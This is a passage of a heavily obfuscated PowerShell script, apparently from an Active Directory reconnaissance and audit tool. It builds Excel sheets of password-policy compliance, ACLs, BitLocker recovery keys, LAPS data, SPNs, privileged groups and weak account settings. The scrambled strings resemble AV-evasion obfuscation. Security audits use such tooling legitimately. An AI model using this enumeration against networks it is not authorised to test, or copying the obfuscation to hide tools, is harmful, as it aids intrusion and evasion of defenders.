            # ASD ISM Enforce password history (passwords)
            "E2", ("{0}{2}{4}{5}{1}{3}{6}" -f'=IF','U','(B','E, FAL','2<8,','TR','SE)')

            # ASD ISM Maximum password age (days)
            "E3", ("{1}{0}{4}{3}{6}{2}{5}{7}"-f 'IF','=','>90','OR(B3=0,B','(','),TRUE, ','3','FALSE)')

            # ASD ISM Minimum password age (days)
            "E4", ("{0}{1}{4}{3}{2}"-f'=IF(B4=0,','TR','FALSE)',' ','UE,')

            # ASD ISM Minimum password length (characters)
            "E5", ("{2}{0}{1}{4}{3}"-f'F(','B5<13,TR','=I','SE)','UE, FAL')

            # ASD ISM Password must meet complexity requirements
            "E6", ("{5}{4}{0}{2}{3}{1}{6}" -f'F(B6',' FALSE','<>TRUE,TR','UE,','I','=',')')

            # ASD ISM Store password using reversible encryption for all users in the domain

            # ASD ISM Account lockout duration (mins)

            # ASD ISM Account lockout threshold (attempts)
            "E9", ((("{4}{3}{1}{0}{2}" -f'),','9=0,B9>5','TRUE, FALSE)','(B','=IF(OR')))

            # ASD ISM Reset account lockout counter after (mins)

            # CIS Benchmark Enforce password history (passwords)
            "G2", ("{0}{1}{5}{3}{2}{4}" -f'=IF(B2<24,T','R','FALSE',' ',')','UE,')

            # CIS Benchmark Maximum password age (days)
            "G3", ("{1}{3}{2}{5}{0}{4}"-f 'SE','=IF(O','B3=0,B3>60),TR','R(',')','UE, FAL')

            # CIS Benchmark Minimum password age (days)
            "G4", ("{0}{2}{4}{5}{1}{3}" -f '=IF(B4','E','=',')','0,','TRUE, FALS')

            # CIS Benchmark Minimum password length (characters)
            "G5", (("{2}{0}{3}{4}{6}{5}{1}"-f '5<14,TRU',')','=IF(B','E',',','E',' FALS'))

            # CIS Benchmark Password must meet complexity requirements
            "G6", (("{2}{0}{4}{3}{1}" -f ',TRUE','E)','=IF(B6<>TRUE',' FALS',','))

            # CIS Benchmark Store password using reversible encryption for all users in the domain
            "G7", (("{0}{5}{4}{6}{1}{2}{7}{3}"-f '=','TR','UE, FALS',')','7<','IF(B','>FALSE,','E'))

            # CIS Benchmark Account lockout duration (mins)
            "G8", (("{3}{6}{1}{0}{4}{2}{5}" -f ',B8<','B8>=1','RU','=IF(AN','15),T','E, FALSE)','D('))

            # CIS Benchmark Account lockout threshold (attempts)
            "G9", (("{1}{5}{3}{0}{6}{4}{2}" -f'R(B9=0,B9>10),TRUE','=','SE)','O',' FAL','IF(',','))

            # CIS Benchmark Reset account lockout counter after (mins)
            "G10", (("{5}{4}{0}{3}{6}{2}{1}"-f '<','E)','E, FALS','15,TR','(B10','=IF','U')) )

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $worksheet.Range($ObjValues[$i]).FormatConditions.Add([Microsoft.Office.Interop.Excel.XlFormatConditionType]::xlExpression, 0, $ObjValues[$i+1]) | Out-Null
                $i++
            }

            "C2", "C3" , "C5", "C6", "C8", "C9", "E2", "E3" , "E4", "E5", "E6", "E9", "G2", "G3", "G4", "G5", "G6", "G7", "G8", "G9", "G10" | ForEach-Object {
                $worksheet.Range($_).FormatConditions.Item(1).StopIfTrue = $false
                $worksheet.Range($_).FormatConditions.Item(1).Font.ColorIndex = 3
            }

            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , ("{11}{5}{14}{3}{17}{4}{0}{1}{6}{10}{7}{16}{12}{2}{13}{9}{8}{15}"-f 'ment_lib','r','o','uritystanda','.org/docu','ttps://ww','ary?','id','pc','ent=','category=pc','h','d','cum','w.pcisec','i_dss','ss&','rds'), "" , "", ("{0}{2}{1}{3}" -f'PCI D',' ','SS','v3.2.1')) | Out-Null
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,6) , ("{0}{5}{3}{7}{1}{4}{2}{6}"-f'h','ac','/is','s','sc.gov.au/infosec','ttp','m/','://'), "" , "", ("{5}{3}{4}{0}{1}{2}" -f'r','o','ls','18 I','SM Cont','20')) | Out-Null
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,7) , ("{6}{9}{7}{0}{2}{5}{4}{1}{8}{3}" -f'rity.org/benchmark','s','/microsoft_','rver/','indow','w','http','www.cisecu','_se','s://'), "" , "", ("{0}{3}{1}{4}{2}" -f 'CIS','enchmark','6',' B',' 201')) | Out-Null

            $excel.ScreenUpdating = $true
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\',("{3}{1}{0}{2}"-f 'l','o','lers.csv','DomainContr'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{4}{1}{3}{2}" -f'Domai','Contr','s','oller','n ')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{0}{2}{3}{4}" -f'roupCh','G','a','ng','es.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{2}{1}{3}" -f 'Group ','ange','Ch','s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{1}{0}{2}" -f 'Na','Group ','me')
        }

        $ADFileName = -join($ReportPath,'\',("{1}{2}{0}"-f's.csv','DA','CL'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}"-f'ACLs','D')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}" -f 'S','.csv','ACLs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}" -f's','SACL')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}"-f 'GP','v','Os.cs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}"-f 'G','POs')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{3}{1}{0}" -f'.csv','s','gP','Link'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f'gPL','inks')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}"-f 'DNSNo','es','d'),("{1}{0}"-f'sv','.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{2}" -f 'NS Reco','D','rds')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{3}{0}{2}" -f'nes.','DNSZ','csv','o'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{1}"-f ' Zone','s','DNS')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{3}{0}{1}"-f's','v','Printers','.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{1}{0}" -f'rs','nte','Pri')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{3}{1}{2}{6}{5}{4}" -f 'Bi','ker','Re','tLoc','ryKeys.csv','ove','c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{1}" -f'itLo','cker','B')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{2}{0}" -f'.csv','LA','PS'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}" -f'APS','L')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{5}{4}{2}{3}{0}"-f's.csv','Co','r','SPN','pute','m'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{3}{1}{0}"-f's','uter SPN','Com','p')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{0}{2}{1}" -f 'Us','Name','er')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{3}{1}{2}"-f 'Com','rs.cs','v','pute'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{2}" -f 'mputer','Co','s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{1}{0}{2}" -f'serNam','U','e')

            $worksheet = $workbook.Worksheets.Item(1)
            # Freeze First Row and Column
            $worksheet.Select()
            $worksheet.Application.ActiveWindow.splitcolumn = 1
            $worksheet.Application.ActiveWindow.splitrow = 1
            $worksheet.Application.ActiveWindow.FreezePanes = $true

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\',("{1}{0}{2}" -f '.','OUs','csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "OUs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{0}{2}"-f'ou','Gr','ps.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f 'Gr','oups')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{3}{0}{1}{2}" -f 's','h','edName','Distingui')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}" -f'G','.csv','roupMembers'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{1}" -f 'roup Memb','ers','G')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{2}{1}{0}" -f 'Name',' ','Group')
        }

        $ADFileName = -join($ReportPath,'\',("{1}{3}{0}{2}" -f'.','Us','csv','erSPNs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{2}{1}"-f 'Use','s','r SPN')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{1}{0}"-f'csv','rs.','Use'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f'Use','rs')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{0}{2}{1}"-f'Us','ame','erN')

            $worksheet = $workbook.Worksheets.Item(1)

            # Freeze First Row and Column
            $worksheet.Select()
            $worksheet.Application.ActiveWindow.splitcolumn = 1
            $worksheet.Application.ActiveWindow.splitrow = 1
            $worksheet.Application.ActiveWindow.FreezePanes = $true

            $worksheet.Cells.Item(1,3).Interior.ColorIndex = 5
            $worksheet.Cells.Item(1,3).font.ColorIndex = 2
            # Set Filter to Enabled Accounts only
            $worksheet.UsedRange.Select() | Out-Null
            $excel.Selection.AutoFilter(3,$true) | Out-Null
            $worksheet.Cells.Item(1,1).Select() | Out-Null
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Computer Role Stats
        $ADFileName = -join($ReportPath,'\',("{2}{4}{1}{3}{0}" -f'v','.c','Comput','s','erSPNs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{3}{2}" -f 'le ','Computer Ro','ts','Sta')
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = ("{0}{1}{3}{4}{2}"-f'Co','m','SPNs','pu','ter ')
            Get-ADRExcelPivotTable -SrcSheetName ("{2}{0}{1}"-f'er SP','Ns','Comput') -PivotTableName $PivotTableName -PivotRows @(("{0}{2}{1}" -f'Ser','e','vic')) -PivotValues @(("{0}{1}" -f 'Serv','ice'))

            $worksheet.Cells.Item(1,1) = ("{1}{0}{2}{3}"-f 'mpute','Co','r Ro','le')
            $worksheet.Cells.Item(1,2) = ("{0}{1}" -f 'Co','unt')

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields(("{1}{0}"-f'ice','Serv')).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,("{0}{1}" -f'Co','unt'))

            Get-ADRExcelChart -ChartType ("{4}{0}{3}{2}{1}"-f 'Co','ustered','l','lumnC','xl') -ChartLayout 10 -ChartTitle ("{1}{3}{2}{0}"-f ' in AD','Compute','es','r Rol') -RangetoCover ("{2}{0}{1}" -f'U','16','D2:')
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , ((("{1}{3}{2}{0}{4}" -f'r SPN','jli','mpute','Co','sjli!A1')).REPLAce(([cHar]106+[cHar]108+[cHar]105),[striNG][cHar]39)), "", ("{2}{1}{0}"-f'a','t','Raw Da')) | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Operating System Stats
        $ADFileName = -join($ReportPath,'\',("{1}{2}{0}" -f 'v','Comp','uters.cs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{4}{2}{3}{0}{1}"-f 'a','ts','stem',' St','Operating Sy')
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = ("{0}{3}{1}{2}" -f'Operatin','Sy','stems','g ')
            Get-ADRExcelPivotTable -SrcSheetName ("{0}{1}" -f 'Comput','ers') -PivotTableName $PivotTableName -PivotRows @(("{4}{3}{2}{0}{1}" -f 'yste','m','ng S','ati','Oper')) -PivotValues @(("{1}{4}{2}{0}{3}"-f'ng Sys','Op','ati','tem','er'))

            $worksheet.Cells.Item(1,1) = ("{2}{0}{3}{1}"-f 'er','em','Op','ating Syst')
            $worksheet.Cells.Item(1,2) = ("{1}{0}"-f 't','Coun')

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields(("{5}{0}{2}{4}{1}{3}" -f 'pe','ing Sys','r','tem','at','O')).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,("{1}{0}"-f'ount','C'))

            Get-ADRExcelChart -ChartType ("{0}{2}{3}{1}"-f'xl','red','Col','umnCluste') -ChartLayout 10 -ChartTitle ("{5}{1}{3}{4}{0}{2}"-f's','Sys',' in AD','t','em','Operating ') -RangetoCover ("{1}{0}"-f'16','D2:S')
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , ("{1}{2}{0}"-f'!A1','Com','puters'), "", ("{0}{1}{2}"-f 'Ra','w D','ata')) | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Group Stats
        $ADFileName = -join($ReportPath,'\',("{2}{0}{4}{3}{1}" -f'upMembers','sv','Gro','c','.'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{4}{2}{3}{0}{5}{1}"-f'd Group S','ats','v','ilege','Pri','t')
            Remove-Variable ADFileName

            $worksheet = $workbook.Worksheets.Item(1)
            $PivotTableName = ("{1}{0}{2}" -f 'mber','Group Me','s')
            Get-ADRExcelPivotTable -SrcSheetName ("{2}{0}{1}" -f'embe','rs','Group M') -PivotTableName $PivotTableName -PivotRows @(("{1}{0}{2}" -f 'Na','Group ','me'))-PivotFilters @(("{1}{2}{0}"-f 'untType','A','cco')) -PivotValues @(("{1}{0}{3}{2}" -f'ntT','Accou','pe','y'))

            # Set the filter
            $worksheet.PivotTables($PivotTableName).PivotFields(("{0}{2}{1}" -f 'Ac','untType','co')).CurrentPage = ("{0}{1}" -f'us','er')

            $worksheet.Cells.Item(1,2).Interior.ColorIndex = 5
            $worksheet.Cells.Item(1,2).font.ColorIndex = 2

            $worksheet.Cells.Item(3,1) = ("{1}{2}{0}"-f 'p Name','Gro','u')
            $worksheet.Cells.Item(3,2) = ("{0}{4}{2}{1}{3}"-f 'C','Re','unt (Not-','cursive)','o')

            $excel.ScreenUpdating = $false
            # Create a copy of the Pivot Table
            $PivotTableTemp = ($workbook.PivotCaches().Item($workbook.PivotCaches().Count)).CreatePivotTable(("{1}{0}" -f 'C5','R1'),("{2}{3}{1}{0}" -f'leTemp','Tab','P','ivot'))
            $PivotFieldTemp = $PivotTableTemp.PivotFields(("{0}{2}{1}"-f 'Grou','e','p Nam'))
            # Set a filter
            $PivotFieldTemp.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
            Try
            {
                $PivotFieldTemp.CurrentPage = ("{2}{0}{3}{1}{4}"-f 'ma','n Ad','Do','i','mins')
            }
            Catch
            {
                # No Direct Domain Admins. Good Job!
                $NoDA = $true
            }
            If ($NoDA)
            {
                Try
                {
                    $PivotFieldTemp.CurrentPage = ("{1}{2}{0}{3}" -f 'r','Administrat','o','s')
                }
                Catch
                {
                    # No Direct Administrators
                }
            }
            # Create a Slicer
            $PivotSlicer = $workbook.SlicerCaches.Add($PivotTableTemp,$PivotFieldTemp)
            # Add Original Pivot Table to the Slicer
            $PivotSlicer.PivotTables.AddPivotTable($worksheet.PivotTables($PivotTableName))
            # Delete the Slicer
            $PivotSlicer.Delete()
            # Delete the Pivot Table Copy
            $PivotTableTemp.TableRange2.Delete() | Out-Null

            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotFieldTemp
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotSlicer
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTableTemp

            Remove-Variable PivotFieldTemp
            Remove-Variable PivotSlicer
            Remove-Variable PivotTableTemp

            ("{0}{3}{1}{2}"-f'Acc',' Op','erators','ount'),("{3}{2}{1}{0}" -f 'rators','inist','m','Ad'),("{2}{0}{3}{1}"-f 'ckup','ators','Ba',' Oper'),("{3}{1}{2}{0}" -f'shers','ert ','Publi','C'),("{0}{1}{3}{2}"-f'Crypto O','pera','s','tor'),("{2}{0}{1}"-f 'dmi','ns','DnsA'),("{1}{0}{2}" -f'omain','D',' Admins'),("{1}{0}{2}{3}{4}"-f 'p','Enter','rise Ad','min','s'),("{5}{2}{1}{0}{3}{4}" -f ' ','ey','K','Admi','ns','Enterprise '),("{0}{8}{9}{4}{6}{2}{5}{1}{7}{3}"-f 'Incoming',' Bu',' Trus','ers','re','t','st','ild',' F','o'),("{0}{1}{2}"-f'Key Ad','m','ins'),("{5}{9}{2}{4}{8}{0}{7}{3}{10}{1}{6}" -f ' Analytics A','istrato','o','mi','ft Advanced Threa','M','rs','d','t','icros','n'),("{0}{3}{1}{2}" -f'Netw','a','tors','ork Oper'),("{1}{2}{0}"-f 'Operators','Print',' '),("{1}{0}{2}"-f 'ected U','Prot','sers'),("{3}{2}{1}{4}{0}"-f 's','sktop','De','Remote ',' User'),("{0}{2}{3}{1}" -f 'Sc','mins','he','ma Ad'),("{0}{2}{3}{1}"-f'Server ','ors','O','perat') | ForEach-Object {
                Try
                {
                    $worksheet.PivotTables($PivotTableName).PivotFields(("{0}{2}{1}" -f'G','p Name','rou')).PivotItems($_).Visible = $true
                }
                Catch
                {
                    # when PivotItem is not found
                }
            }

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            $worksheet.PivotTables($PivotTableName).PivotFields(("{2}{0}{1}"-f ' ','Name','Group')).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,("{3}{5}{0}{1}{2}{4}"-f 't (N','ot-Recurs','ive','C',')','oun'))

            $worksheet.Cells.Item(3,1).Interior.ColorIndex = 5
            $worksheet.Cells.Item(3,1).font.ColorIndex = 2

            $excel.ScreenUpdating = $true

            Get-ADRExcelChart -ChartType ("{1}{4}{3}{2}{0}" -f 'ered','xlColumn','ust','l','C') -ChartLayout 10 -ChartTitle ("{3}{2}{0}{4}{1}"-f' Groups ','n AD','vileged','Pri','i') -RangetoCover ("{0}{1}"-f 'D2:P','16') -StartRow "A3" -StartColumn "B3"
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , "" , ((("{6}{3}{1}{7}{4}{0}{5}{2}"-f 'bersi','o','1','zlGr','m','zl!A','i','up Me')).rEpLace('izl',[sTRIng][cHAr]39)), "", ("{1}{0}"-f 'a','Raw Dat')) | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        # Computer Stats
        $ADFileName = -join($ReportPath,'\',("{3}{2}{1}{0}{4}" -f 's','ers.c','put','Com','v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{1}"-f'puter S','tats','Com')
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.Add(("{2}{4}{0}{3}{1}"-f'ati','p','Dele','on Ty','g'),((("{0}{3}{2}{1}{4}{5}" -f'ZHVUn','traine','s','con','dZH','V'))  -crePLACE  ([cHAR]90+[cHAR]72+[cHAR]86),[cHAR]34))
            $ObjAttributes.Add(("{1}{2}{0}"-f'on Type','Delegat','i'),((("{0}{3}{4}{1}{2}"-f'f','str','ainedf01','01Co','n')).REPLaCE(([chAr]102+[chAr]48+[chAr]49),[StrIng][chAr]34)))
            $ObjAttributes.Add(("{0}{2}{1}"-f 'SI','ry','DHisto'),'"*"')
            $ObjAttributes.Add(("{1}{2}{0}" -f 'nt','Dor','ma'),((("{2}{3}{0}{1}"-f'{0','}','{0}','TRUE'))  -f [chaR]34))
            $ObjAttributes.Add(((("{3}{2}{0}{1}" -f 'rd A','ge (> ','o','Passw'))),((("{0}{2}{1}"-f 'iNITR','I','UEiN'))-REPLAce ([CHaR]105+[CHaR]78+[CHaR]73),[CHaR]34))
            $ObjAttributes.Add(("{3}{0}{1}{4}{2}" -f's-ds-Cr','ea','orSid','m','t'),'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName ("{2}{0}{1}"-f 'om','puters','C') -Title1 ("{2}{1}{0}{4}{3}" -f'cc','r A','Compute','unts in AD','o') -PivotTableName ("{3}{4}{0}{2}{1}" -f'nt','tatus','s S','Computer Acc','ou') -PivotRows ("{2}{0}{1}"-f 'ble','d','Ena') -PivotValues ("{2}{0}{1}"-f'm','e','UserNa') -PivotPercentage ("{1}{0}"-f'e','UserNam') -Title2 ("{3}{2}{1}{4}{0}" -f'Accounts','mpute','Co','Status of ','r ') -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType ("{0}{1}"-f 'xl','Pie') -ChartLayout 3 -ChartTitle ("{5}{4}{3}{6}{0}{1}{2}" -f ' in ','A','D','oun','mputer Acc','Co','ts') -RangetoCover ("{0}{1}" -f 'A11:','D23') -ChartData $workbook.Worksheets.Item(1).Range(("{1}{2}{0}" -f'B3:B4','A','3:A4,'))
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(10,1) , "" , ("{2}{1}{0}"-f 'ers!A1','omput','C'), "", ("{0}{1}{2}" -f'Ra','w D','ata')) | Out-Null

            Get-ADRExcelChart -ChartType ("{1}{3}{0}{2}" -f 'lus','xlB','tered','arC') -ChartLayout 1 -ChartTitle ("{0}{5}{6}{2}{1}{4}{3}"-f 'Stat','mp','o','ter Accounts','u','us of',' C') -RangetoCover ("{1}{0}" -f'L23','F11:') -ChartData $workbook.Worksheets.Item(1).Range(("{0}{2}{1}" -f'F','G8','2:F8,G2:'))
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(10,6) , "" , ("{0}{1}{2}"-f'Co','mputer','s!A1'), "", ("{0}{1}"-f 'Raw Dat','a')) | Out-Null

            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
            $excel.Windows.Item(1).Displaygridlines = $false
        }

        # User Stats
        $ADFileName = -join($ReportPath,'\',("{2}{1}{0}"-f '.csv','s','User'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}{2}"-f'Use','r S','tats')
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.Add(("{4}{2}{8}{1}{6}{7}{5}{3}{0}"-f't Logon','C','t','sword a','Mus','Pas','han','ge ',' '),((("{0}{2}{1}" -f'{0}','{0}','TRUE'))-F[chAR]34))
            $ObjAttributes.Add(("{2}{5}{6}{3}{4}{0}{1}" -f'r','d','Cannot Chang','ass','wo','e ','P'),((("{2}{1}{0}"-f'TRUEWwe','we','W')).RepLace(([CHAR]87+[CHAR]119+[CHAR]101),[StRiNg][CHAR]34)))
            $ObjAttributes.Add(("{2}{3}{1}{4}{0}" -f'res','er ','Pass','word Nev','Expi'),((("{1}{2}{3}{0}"-f'Zc','KZcTR','UE','K')) -crePLAcE  'KZc',[chaR]34))
            $ObjAttributes.Add(("{2}{6}{1}{3}{0}{8}{4}{7}{5}" -f 'e Pa','rsib','Rev','l','swo','on','e','rd Encrypti','s'),((("{1}{2}{0}" -f'ud','WudT','RUEW')).rEPlAcE(([cHaR]87+[cHaR]117+[cHaR]100),[STRiNG][cHaR]34)))
            $ObjAttributes.Add(("{2}{6}{1}{3}{4}{0}{5}"-f 're','d ','Smartca','Lo','gon Requi','d','r'),((("{2}{0}{1}" -f 'TRU','E0dr','0dr'))  -rEplacE'0dr',[cHaR]34))
            $ObjAttributes.Add(("{2}{0}{1}{4}{3}"-f 'elegat','ion','D','itted',' Perm'),((("{1}{3}{0}{2}" -f 'RUE','do','dot','tT')) -CrEPlacE 'dot',[Char]34))
            $ObjAttributes.Add(("{5}{4}{1}{2}{3}{0}"-f'nly','os D','ES ','O','erber','K'),((("{1}{0}{3}{2}" -f 'YgTR','I','IYg','UE')).RepLAce(([chAr]73+[chAr]89+[chAr]103),[strinG][chAr]34)))
            $ObjAttributes.Add(("{0}{1}{2}{3}"-f 'Kerb','ero','s RC','4'),((("{1}{2}{0}" -f'{0}','{0}','TRUE'))-F  [ChaR]34))
            $ObjAttributes.Add(("{3}{2}{4}{0}{1}"-f'ire ','Pre Auth','ot','Does N',' Requ'),((("{3}{0}{1}{2}"-f'oj','T','RUEZoj','Z')) -repLaCE ([cHar]90+[cHar]111+[cHar]106),[cHar]34))
            $ObjAttributes.Add(((("{0}{2}{1}{3}"-f 'Pas','r','swo','d Age (> '))),((("{1}{2}{3}{0}" -f'1gM','1gMT','RU','E')).ReplAce(([ChAR]49+[ChAR]103+[ChAR]77),[stRinG][ChAR]34)))
            $ObjAttributes.Add(("{1}{3}{0}{2}"-f'nt L','Ac','ocked Out','cou'),((("{2}{0}{3}{1}" -f'R','{0}','{0}T','UE'))  -F  [CHAR]34))
            $ObjAttributes.Add(("{0}{4}{1}{2}{3}"-f 'Neve',' L','og','ged in','r'),((("{0}{2}{1}" -f '{0}','UE{0}','TR')) -f [cHaR]34))
            $ObjAttributes.Add(("{0}{1}" -f'D','ormant'),((("{1}{0}"-f 'FT','AFTTRUEA')).rePlaCe(([chaR]65+[chaR]70+[chaR]84),[strIng][chaR]34)))
            $ObjAttributes.Add(("{2}{3}{4}{0}{1}{5}"-f'eq','uire','Passw','or','d Not R','d'),((("{1}{2}{0}"-f 'Zu','bZ','uTRUEb')) -crEPLAce  'bZu',[CHar]34))
            $ObjAttributes.Add(("{4}{1}{0}{3}{2}" -f'ega','l','yp','tion T','De'),((("{1}{2}{4}{0}{3}{5}{6}" -f 'ned','W','aRUncons','W','trai','a','R'))-rEpLaCe'WaR',[char]34))
            $ObjAttributes.Add(("{3}{0}{2}{1}"-f 'DHist','y','or','SI'),'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName ("{0}{1}"-f 'User','s') -Title1 ("{1}{3}{4}{2}{0}"-f 'D','Us','unts in A','er Acc','o') -PivotTableName ("{0}{1}{2}{4}{3}{5}" -f 'Use','r A','c','unts Statu','co','s') -PivotRows ("{2}{1}{0}" -f 'ed','abl','En') -PivotValues ("{2}{0}{1}"-f 'serN','ame','U') -PivotPercentage ("{0}{2}{1}"-f 'U','erName','s') -Title2 ("{2}{1}{3}{0}"-f 's','atus of U','St','ser Account') -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType ("{0}{1}"-f 'xlP','ie') -ChartLayout 3 -ChartTitle ("{0}{3}{2}{5}{1}{4}"-f 'User A','in ','unts','cco','AD',' ') -RangetoCover ("{0}{1}" -f 'A','21:D33') -ChartData $workbook.Worksheets.Item(1).Range(("{0}{2}{1}"-f'A3:A','B3:B4','4,'))
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(20,1) , "" , ("{1}{0}"-f's!A1','User'), "", ("{1}{0}" -f ' Data','Raw')) | Out-Null

